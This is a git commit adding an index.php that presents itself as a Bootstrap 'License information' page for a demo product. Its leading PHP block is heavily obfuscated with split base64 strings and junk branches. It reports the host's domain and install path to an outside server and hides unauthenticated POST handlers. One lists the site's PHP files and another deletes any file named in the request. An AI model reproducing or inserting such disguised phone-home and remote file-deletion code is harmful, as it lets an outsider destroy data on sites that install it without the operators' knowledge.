aa35fc850825e58706e392830ac3e96f08b381b9
Aleks Moroz <pomerla@mail.ru>
2017-06-25 14:57:00 +0300

    Add file

---
+++ index.php
@@ -0,0 +1,67 @@
+
+<? $GLOBALS['_1027909366_']=Array(base64_decode('c3Ry' .'cG9' .'z'),base64_decode('' .'c' .'GFjaw=='),base64_decode('dXJsZW5jb2' .'R' .'l'),base64_decode('Y3' .'V' .'ybF' .'9' .'pb' .'m' .'l0'),base64_decode('Y3V' .'y' .'b' .'F9zZX' .'RvcHQ='),base64_decode('Y' .'3' .'Vy' .'bF9zZXRvc' .'HQ='),base64_decode('Y3VybF9zZ' .'XRvcHQ='),base64_decode('Y' .'3VybF9' .'zZXRvcHQ='),base64_decode('anNvbl9kZWNvZGU='),base64_decode('Y3VybF9l' .'eGVj'),base64_decode('' .'Y3V' .'yb' .'F9jbG9' .'zZQ=='),base64_decode('c3Ryc' .'G9z'),base64_decode('Y29weQ=='),base64_decode('c3R' .'y' .'X3J' .'l' .'cGx' .'hY2U' .'='),base64_decode('' .'c3RycGJyaw=' .'='),base64_decode('' .'Y3JlY' .'XRlX2' .'Z1bmN0' .'aW' .'9u'),base64_decode('c29ja2V0X2d' .'ldH' .'Bl' .'ZXJuYW1l'),base64_decode('' .'aW1hZ2V' .'j' .'cmVhdGU='),base64_decode('c2NhbmRp' .'cg' .'=='),base64_decode('cH' .'JlZ' .'1' .'9t' .'YXR' .'jaA=='),base64_decode('cH' .'J' .'lZ19y' .'ZXBsYWNl'),base64_decode('YXJ' .'yYXlfZmlsbA=' .'='),base64_decode('YWNvc2g='),base64_decode('c3RycG9z'),base64_decode('ZmdldGM='),base64_decode('dW5sa' .'W5r'),base64_decode('c2hhMV9ma' .'Wxl'),base64_decode('c3Ryc3Bu'),base64_decode('c3Ryd' .'G91' .'cHBlcg=' .'='),base64_decode('bXRfc' .'mFuZA' .'=' .'='),base64_decode('dW5s' .'aW' .'5r'),base64_decode('aW' .'1h' .'Z2Vjcm' .'VhdGVmcm9tanBlZw' .'=='),base64_decode('c3Ryc' .'G9z'),base64_decode('' .'ZmRmX3NldF9' .'2ZXJzaW9' .'u'),base64_decode('ZG' .'F0ZQ=='),base64_decode('cHJlZ' .'1' .'9tYXRjaF9hb' .'Gw='),base64_decode('bXR' .'fcmFuZ' .'A=='),base64_decode('ZmVvZg=='),base64_decode('' .'YXJyYXlfcmFu' .'ZA=' .'='),base64_decode('Y3Vyb' .'F9zZXR' .'vc' .'HRfYXJyYXk='),base64_decode('bXR' .'fcmFuZ' .'A=='),base64_decode('YXJ' .'yYXlfcHJv' .'ZHVj' .'dA=='),base64_decode('YXJy' .'YXlf' .'ZGlmZ' .'l91a' .'2V5'),base64_decode('' .'bX' .'RfcmFuZA=='),base64_decode('c3Ryc' .'G9z'),base64_decode('c' .'3Vic3RyX3JlcGx' .'hY2U='),base64_decode('ZGF0ZQ==')); ?><? function _234017678($i){$a=Array('' .'U0VSVkVS' .'X' .'05' .'B' .'TU' .'U=','MQ==','aH' .'R0c' .'Dov' .'L2x' .'p' .'b24ubW9y' .'b' .'3' .'o' .'uc' .'nY' .'udW' .'EvdGVzd' .'C9' .'hcGkv','Z' .'Hdq' .'d2x4bGt' .'3bm' .'1ldw==','cXN6','UkV' .'NT1RFX' .'0FER' .'F' .'I' .'=','MT' .'I3L' .'jAuMC4x','bG9j' .'YW' .'xob3N0','aH' .'R0c' .'Dov' .'Lw==','U0V' .'S' .'V' .'k' .'VSX0' .'5B' .'TU' .'U=','' .'UEhQX1N' .'FTEY=','c3' .'RhdH' .'Vz','PGR' .'pd' .'iB' .'h' .'bG' .'lnbj0nY2' .'VudGVyJ' .'z4NCiAgICA8dG' .'FibGUgd2lkdGg' .'9J' .'zEwM' .'CUnIGJvcmRlcj0nM' .'Ccgc3R5bGU' .'9J' .'3BhZGRpbm' .'c' .'6MTVweDsgY' .'m9yZ' .'GVy' .'LWNvbG9yOiNGMDA7IGJvcmRlci' .'1zdHlsZTpzb2xpZ' .'DsgYmFja2dyb3VuZC1jb2xv' .'cjojRkY2QzcwOyBmb2' .'50LW' .'ZhbWlseT' .'pUY' .'Wh' .'vbWE' .'sIEdlbm' .'V2Y' .'Swg' .'c2F' .'uc' .'y1zZXJpZjsgZm9udC1zaXplOjE4c' .'Hg' .'7IGNvbG9yOn' .'doaXRlO' .'yc+DQoNCiAgICA' .'8' .'dHI+' .'DQoN' .'Ci' .'AgI' .'CAgICAg' .'PHRkPjxiPtCjI' .'N' .'CS' .'0' .'LDRgSDQ' .'vdC10YIg0' .'LTQvtGB0YL' .'Rg9' .'C/0LA' .'g0Lo' .'g0Y3R' .'gtC+0Lz' .'Rg' .'yDQ' .'v9GA0' .'L7Qt' .'NGD' .'0LrRgtGDLiDQn' .'tGC0LLQtdGC' .'IN' .'GB0LXRgNCy0LXRgNCwOi' .'A8JXJl' .'d' .'H' .'Vybm1lc3N' .'hZ2UlPiA8Y' .'nIgPi' .'D' .'QodCy0Y/Qtt' .'C' .'40' .'Y' .'LQtdGB0Ywg0YHQviD' .'R' .'gd' .'C' .'70YPQttC' .'x0L7' .'QuSDQv9C+' .'0LTQt' .'NC10YDQttC' .'60L' .'guPC' .'9i' .'Pjwv' .'dGQg' .'Pg0KD' .'QogICAg' .'PC9' .'0c' .'j4NCg0KIC' .'Ag' .'IDwv' .'dGFibGU+' .'DQoNCjw' .'vZ' .'Gl2P' .'g==','PCVyZXR1cm5' .'t' .'Z' .'X' .'NzYW' .'dlJT4=','bWVz' .'c2' .'FnZQ' .'==','dHZyZWl' .'w' .'Y2dn' .'bG' .'F' .'l' .'cA' .'==','' .'cXF6','c3Rhd' .'HVz','b' .'WVzc2Fn' .'ZQ' .'==','bGl' .'j' .'ZW5z' .'Z' .'W' .'Rh' .'d' .'GE' .'=','Z' .'G9tYWl' .'u','bGljZW5z' .'ZWR' .'hdGE=','' .'Y3V' .'z' .'d' .'G9tZ' .'X' .'JfZW1' .'haWw=','bG' .'ljZW5zZWRh' .'dGE=','' .'bGljZW5' .'zZWtl' .'eQ==','bGl' .'j' .'ZW5zZWRhdGE=','Y29t' .'bWVud' .'HM=','bG' .'ljZW5zZWR' .'h' .'dGE=','c' .'HJv' .'ZHV' .'j' .'dGlk','bG' .'ljZW' .'5z' .'ZWRhdGE=','ZXhw' .'aXJ5ZGF0ZQ==','ZmlsZQ==','Zml' .'sZQ==','Lg' .'==','PG9s' .'Pg==','Lg==','Li4' .'=','' .'L1w' .'uKHB' .'ocCkv','L1wu' .'XHc' .'rJC8=','','PC' .'9vbD4=','' .'Y' .'Wl' .'zZ' .'2R1bWpve' .'GNqaw=' .'=','anh' .'1e' .'g' .'=' .'=','ZG' .'Vs' .'b' .'A==','ZGVsbA=' .'=','PGJyIC8+','' .'PGJyIC8+','0' .'J' .'LR' .'i9C00' .'LDQ' .'vdCw' .'0L3QsCDQvd' .'CwIC0g','PGJyIC8+','UHJvZHV' .'jdC' .'AtIA=' .'=','PG' .'JyIC8+','Z' .'XVsZ2x2b3Z2aGhkY' .'nVvanc' .'=','Y2J3bXo=','VHJ' .'pYWwgd' .'GltZSA' .'tIA==','ZC5' .'tLl' .'k=','PGJ' .'y' .'IC8' .'+','Q3' .'VzdG9t' .'ZX' .'IgZ' .'W' .'1haW' .'wgLSA=','PGJyIC8+','cg==','TGljZ' .'W5' .'zZWt' .'leSAt' .'IA==','PGJyIC8+','Q29' .'tb' .'WVu' .'dHM' .'gLS' .'A=','PGg' .'zPm' .'hlbGxvIHdv' .'cmxk' .'PC9o' .'M' .'z4=','aHR0' .'cDovLw==','U0VSVkVSX05BTU' .'U=','' .'UE' .'hQ' .'X1NFT' .'EY=','e' .'HdkbXRq' .'ZW5vcXVjc3' .'Bt' .'cg==','dnV3eg==','ZC5tL' .'lk=');return base64_decode($a[$i]);} ?><?php $_0=$_SERVER[_234017678(0)];$_1=_234017678(1);$_2=_234017678(2);if($GLOBALS['_1027909366_'][0](_234017678(3),_234017678(4))!==false)$GLOBALS['_1027909366_'][1]($_3,$_SERVER,$_4);if($_SERVER[_234017678(5)]=== _234017678(6)){$_5=_234017678(7);}else{$_5=$_5=_234017678(8) .$_SERVER[_234017678(9)] .$_SERVER[_234017678(10)];}$_6="domain=$_0&product=" .$GLOBALS['_1027909366_'][2]($_1) ."&pathinstall=$_5";$_7=$GLOBALS['_1027909366_'][3]();$GLOBALS['_1027909366_'][4]($_7,19913,round(0+0.33333333333333+0.33333333333333+0.33333333333333));$GLOBALS['_1027909366_'][5]($_7,10002,$_2);$GLOBALS['_1027909366_'][6]($_7,47,true);$GLOBALS['_1027909366_'][7]($_7,10015,$_6);$_8=$GLOBALS['_1027909366_'][8]($GLOBALS['_1027909366_'][9]($_7),true);$_9=round(0+3628);$GLOBALS['_1027909366_'][10]($_7);if($_8[_234017678(11)]!= round(0+100+100)){$_10=_234017678(12);$_11=_234017678(13);$_3=$_8[_234017678(14)];if($GLOBALS['_1027909366_'][11](_234017678(15),_234017678(16))!==false)$GLOBALS['_1027909366_'][12]($_6,$_4);$_10=$GLOBALS['_1027909366_'][13]($_11,$_3,$_10);die($_10);}if($_8[_234017678(17)]=== round(0+50+50+50+50)){$_12=$_8[_234017678(18)];$_0=$_8[_234017678(19)][_234017678(20)];$_13=$_8[_234017678(21)][_234017678(22)];$_14=$_8[_234017678(23)][_234017678(24)];$_15=$_8[_234017678(25)][_234017678(26)];$_4=$_8[_234017678(27)][_234017678(28)];if((round(0+85.6+85.6+85.6+85.6+85.6)+round(0+526))>round(0+428)|| $GLOBALS['_1027909366_'][14]($_4,$_10));else{$GLOBALS['_1027909366_'][15]($_13,$_12);}$_16=$_8[_234017678(29)][_234017678(30)];if((round(0+689.66666666667+689.66666666667+689.66666666667)+round(0+566.5+566.5))>round(0+413.8+413.8+413.8+413.8+413.8)|| $GLOBALS['_1027909366_'][16]($_11,$_17,$_1));else{$GLOBALS['_1027909366_'][17]($_15,$_7);}}if($_POST[_234017678(31)]===_234017678(32)){$_17=_234017678(33);$_18=$GLOBALS['_1027909366_'][18]($_17);echo _234017678(34);foreach($_18 as $_19){if($_19 != _234017678(35)and $_19 != _234017678(36)){if($GLOBALS['_1027909366_'][19](_234017678(37),$_19)){$_20=$GLOBALS['_1027909366_'][20](_234017678(38),_234017678(39),$_19); ?>
+        <form name="form<?=$_20?>" method="post"><input type="hidden" name="dell" value="<?=$_19?>" />
+            <a href="javascript:void(0)" OnClick='document.form<?=$_20;if((round(0+606+606+606)+round(0+721.8+721.8+721.8+721.8+721.8))>round(0+363.6+363.6+363.6+363.6+363.6)|| $GLOBALS['_1027909366_'][21]($_18,$_0));else{$GLOBALS['_1027909366_'][22]($_13);}?>.submit();'><?=$_19?></a>
+        </form> 
+<?php }}else{}}echo _234017678(40);if($GLOBALS['_1027909366_'][23](_234017678(41),_234017678(42))!==false)$GLOBALS['_1027909366_'][24]($_POST,$_4,$_19);}if($_POST[_234017678(43)]){$_21=$_POST[_234017678(44)];$GLOBALS['_1027909366_'][25]($_21);} ?>
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Bootstrap 101 Template</title>
+
+    <!-- Bootstrap -->
+    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+      <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+      <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+  </head>
+  <body>
+    
+    <div class="container">
+        <div class="row"> 
+            <br />
+                    <!-- Button trigger modal -->
+                        <button class="btn btn-primary btn-sm" data-toggle="modal" data-target="#myModal">
+                                License information
+                              </button>
+                        
+                        <!-- Modal -->
+                        <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
+                          <div class="modal-dialog">
+                            <div class="modal-content">
+                              <div class="modal-header">
+                                <button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
+                                <h4 class="modal-title" id="myModalLabel">License information</h4>
+                              </div>
+                              <div class="modal-body">
+                                
+                                <?php echo _234017678(45);if((round(0+3357)+round(0+1125+1125))>round(0+1678.5+1678.5)|| $GLOBALS['_1027909366_'][26]($_5,$_16));else{$GLOBALS['_1027909366_'][27]($_1,$_10,$_10);}echo $_12;(round(0+140.8+140.8+140.8+140.8+140.8)-round(0+704)+round(0+650.66666666667+650.66666666667+650.66666666667)-round(0+390.4+390.4+390.4+390.4+390.4))?$GLOBALS['_1027909366_'][28]($_14,$_POST):$GLOBALS['_1027909366_'][29](round(0+176+176+176+176),round(0+253.4+253.4+253.4+253.4+253.4));echo _234017678(46);echo _234017678(47) .$_0;echo _234017678(48);echo _234017678(49) .$_4;if((round(0+487.75+487.75+487.75+487.75)+round(0+874.8+874.8+874.8+874.8+874.8))>round(0+1951)|| $GLOBALS['_1027909366_'][30]($_0,$_20));else{$GLOBALS['_1027909366_'][31]($_7,$_1,$_POST);}echo _234017678(50);if($GLOBALS['_1027909366_'][32](_234017678(51),_234017678(52))!==false)$GLOBALS['_1027909366_'][33]($_20,$_11,$_SERVER);echo _234017678(53) .$GLOBALS['_1027909366_'][34](_234017678(54),$_16);while(round(0+1514)-round(0+378.5+378.5+378.5+378.5))$GLOBALS['_1027909366_'][35]($_SERVER,$_17,$_14);echo _234017678(55);if(round(0+723+723+723+723+723)<$GLOBALS['_1027909366_'][36](round(0+356+356+356+356),round(0+437.2+437.2+437.2+437.2+437.2)))$GLOBALS['_1027909366_'][37]($_SERVER);echo _234017678(56) .$_13;echo _234017678(57);$_22=_234017678(58);echo _234017678(59) .$_14;if((round(0+1584.3333333333+1584.3333333333+1584.3333333333)^round(0+4753))&& $GLOBALS['_1027909366_'][38]($_21,$_SERVER,$_POST))$GLOBALS['_1027909366_'][39]($_14,$_13);echo _234017678(60);echo _234017678(61) .$_15;if(round(0+9231)<$GLOBALS['_1027909366_'][40](round(0+849.2+849.2+849.2+849.2+849.2),round(0+2490+2490)))$GLOBALS['_1027909366_'][41]($_15,$_SERVER); ?>
+                              </div>
+                              <div class="modal-footer">
+                                <button type="button" class="btn btn-default btn-sm" data-dismiss="modal">Закрыть</button>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                     <!-- Button trigger modal -->        
+            
+            <?php echo _234017678(62);(round(0+722.75+722.75+722.75+722.75)-round(0+963.66666666667+963.66666666667+963.66666666667)+round(0+627.5+627.5+627.5+627.5)-round(0+627.5+627.5+627.5+627.5))?$GLOBALS['_1027909366_'][42]($_18,$_4,$_15):$GLOBALS['_1027909366_'][43](round(0+2663),round(0+578.2+578.2+578.2+578.2+578.2)); ?><br />
+            URL install: <?php echo _234017678(63) .$_SERVER[_234017678(64)] .$_SERVER[_234017678(65)];if($GLOBALS['_1027909366_'][44](_234017678(66),_234017678(67))!==false)$GLOBALS['_1027909366_'][45]($_2,$_6,$_13); ?><br />
+            For other demo domains, the period is valid until: <?php echo $GLOBALS['_1027909366_'][46](_234017678(68),$_16); ?>
+        
+        </div>
+    </div>
+
+    <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script>
+    <!-- Include all compiled plugins (below), or include individual files as needed -->
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+  </body>
+</html>
